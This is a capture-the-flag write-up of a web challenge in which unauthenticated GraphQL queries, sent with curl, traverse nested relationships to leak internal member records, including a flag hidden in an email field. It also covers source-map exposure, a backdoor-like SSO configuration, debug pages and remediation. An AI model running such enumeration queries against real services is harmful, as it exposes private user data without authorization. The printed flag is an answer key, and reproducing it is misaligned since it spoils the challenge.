# rEquestria - Lesson Zero Writeup

## Challenge Information

| Field | Value |
| --- | --- |
| Category | `Offensive Security` |
| Challenge | `rEquestria - Lesson Zero` |
| Target | `https://mail.equestriasociety.com/` |
| Goal | Perform initial unauthenticated enumeration and recover the flag |
| Flag Format | `SK-CERT{...}` |

## TL;DR

The challenge is solvable without logging in.

The web app exposes a public GraphQL API. While the login page only shows a harmless public news feed, the backend allows unauthenticated traversal from:

- `newsFeed`
- `author`
- `subOrganization`
- `members`

One of the leaked member objects contains the flag inside the `email` field:

```text
SK-CERT{l34ky_l34ks_4ll_0v3r_3questria}
```

---

## 1. Initial Recon

Visiting the target shows a login page for the "Equestria Friendship Society" messaging platform.

At first glance the application looks like a standard SPA:

- login form
- Microsoft SSO button
- public news feed

The challenge description strongly hints that the intended path is **unauthenticated enumeration**, so the first step is to avoid brute force or auth bypass attempts and inspect everything that is exposed publicly.

### Basic fingerprinting

The root page is served by `nginx/1.29.5` and loads a React frontend.

One useful public artifact was:

```text
/asset-manifest.json
```

That file revealed:

```json
{
  "files": {
    "main.js": "/static/js/main.36c9c96c.js",
    "index.html": "/index.html",
    "main.36c9c96c.js.map": "/static/js/main.36c9c96c.js.map"
  }
}
```

The public source map was a big clue because it exposed the original frontend component names and GraphQL operations.

---

## 2. Frontend Source Map Findings

The source map showed several important frontend components:

- `components/Login.js`
- `components/Users.js`
- `components/SsoConfigurations.js`
- `components/Dashboard.js`
- `App.js`

### Interesting client-side observations

From the source map:

- The login page queries a public `newsFeed`.
- There is also an `enabledSsoConfigurations` query.
- `CUSTOM_SSO_ENABLED = false`, meaning hidden SSO options are disabled in the UI, but not necessarily on the backend.
- Authenticated users can download `/download/source`.
- The app trusts a `?token=...` parameter and stores it in `localStorage`.

These were useful clues, but they were not actually required to get the flag.

The key lesson was simpler:

> The frontend already confirmed that GraphQL was the core backend interface, so the next step was to enumerate the schema directly.

---

## 3. GraphQL Enumeration

The endpoint was publicly reachable at:

```text
https://mail.equestriasociety.com/graphql
```

Even unauthenticated, it responded normally.

### Public `newsFeed`

A first safe probe:

```bash
curl -sS https://mail.equestriasociety.com/graphql \
  -H 'Content-Type: application/json' \
  --data '{"query":"query { newsFeed { id title content insertedAt author { name role } } }"}'
```

This returned public news posts and their authors, including:

- `Luna Starlight`
- `Rose Garden`
- `Starswirl Helper`

At that point, the site looked like it intentionally allowed anonymous access to the news feed.

### Why keep digging?

GraphQL often becomes vulnerable when:

- a top-level query is intentionally public
- nested objects behind that query are not properly authorization-checked
- internal relationships can be traversed far beyond what the UI displays

So instead of stopping at `title` and `author`, the next step was to ask for deeper fields.

---

## 4. The Vulnerable Object Graph

The important public relationship chain was:

```text
newsFeed -> author -> subOrganization -> members
```

That is exactly the kind of traversal that can expose internal data if field-level authorization is missing.

### Query used

```bash
curl -sS https://mail.equestriasociety.com/graphql \
  -H 'Content-Type: application/json' \
  --data '{"query":"query { newsFeed { title author { name subOrganization { name members { id email name role insertedAt } } } } }"}'
```

### Response snippet

The most important part of the response came from the `volunteer_outreach` sub-organization:

```json
{
  "title": "Security Reminder: Protect Your Account",
  "author": {
    "name": "Starswirl Helper",
    "subOrganization": {
      "name": "volunteer_outreach",
      "members": [
        {
          "email": "starswirl.helper@equestriasociety.com",
          "name": "Starswirl Helper",
          "role": 2
        },
        {
          "email": "moon.dancer@equestriasociety.com",
          "name": "Moon Dancer",
          "role": 1
        },
        {
          "email": "twilight.scholar@equestriasociety.com",
          "name": "Twilight Scholar",
          "role": 0
        },
        {
          "email": "fluttershy.quiet@equestriasociety.com",
          "name": "Fluttershy Quiet",
          "role": 0
        },
        {
          "email": "SK-CERT{l34ky_l34ks_4ll_0v3r_3questria}@lol.com",
          "name": "Flaggie Flag",
          "role": 2
        }
      ]
    }
  }
}
```

This immediately exposed the flag embedded in the email address of a hidden user.

---

## 5. Why the Exploit Worked

This challenge is a classic example of **Broken Access Control through GraphQL overexposure**.

The site intended to expose only a public news feed, but it also exposed related internal objects through nested fields:

- `newsFeed` was public
- `author` was public
- `subOrganization` was public
- `members` of that sub-organization were also public

That means unauthenticated users could enumerate internal staff/member records even though the UI never displayed them.

The core bug was not "GraphQL exists". The core bug was:

> A public query was allowed to traverse into sensitive nested relationships without authorization checks at each resolver boundary.

---

## 6. Side Findings During Recon

These findings were interesting but not necessary for the final solve.

### Source map exposure

The app shipped a public JavaScript source map, which revealed:

- component names
- hidden UI functionality
- GraphQL operation names
- backend routes like `/download/source`

### Suspicious SSO configuration

The public query below leaked a backdoor-like Okta tenant:

```graphql
query {
  enabledSsoConfigurations {
    id
    name
    provider
    domain
    clientId
    insertedAt
    updatedAt
  }
}
```

It returned a configuration similar to:

- `name: backdoor`
- `provider: okta`
- `domain: localhost`
- `clientId: test`

### Debug error exposure

Malformed requests to `/auth/okta/callback` triggered Phoenix debug pages that leaked:

- backend file paths
- stack traces
- controller line numbers
- partial source code snippets

This was another serious issue, but it was not required for the flag because the GraphQL leak was already enough.

---

## 7. Full Attack Path Summary

1. Visit the target and confirm it is a React SPA with a public login page.
2. Pull `/asset-manifest.json` and identify the public source map.
3. Use the source map to understand the app's GraphQL-heavy architecture.
4. Query the public GraphQL endpoint directly.
5. Start from the intended anonymous query: `newsFeed`.
6. Traverse deeper into nested objects: `author -> subOrganization -> members`.
7. Recover the flag from the leaked `email` field of a hidden member record.

This is exactly what the challenge title suggests: **Lesson Zero** means doing solid unauthenticated enumeration before attempting anything more advanced.

---

## 8. Remediation Notes

If this were a real application, the fixes would include:

- Enforce authorization on every sensitive GraphQL field and relationship resolver.
- Do not expose internal member lists through public object graphs.
- Disable GraphQL introspection in production if not required.
- Do not ship public source maps in production.
- Never expose Phoenix debug pages in production.
- Review all "public" queries for unsafe nested traversal.

---

## Final Flag

```text
SK-CERT{l34ky_l34ks_4ll_0v3r_3questria}
```
